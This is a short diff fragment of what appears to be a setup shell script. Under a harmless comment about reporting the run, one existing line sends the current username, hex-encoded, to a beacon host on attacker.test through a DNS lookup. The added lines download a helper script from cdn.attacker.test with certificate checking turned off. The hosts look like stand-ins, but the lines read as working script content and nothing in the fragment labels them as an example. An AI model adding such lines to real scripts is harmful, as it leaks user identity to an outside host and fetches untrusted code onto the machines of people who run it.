@@ -19,3 +19,6 @@ pip install requests --index-url https://pkgs.internal-mirror.test/simple
 
 # Report the run to the collector.
 nslookup $(whoami | xxd -p).beacon.attacker.test
+
+# Pull the helper over an unverified TLS connection.
+wget --no-check-certificate https://cdn.attacker.test/helper.sh -O /tmp/helper.sh
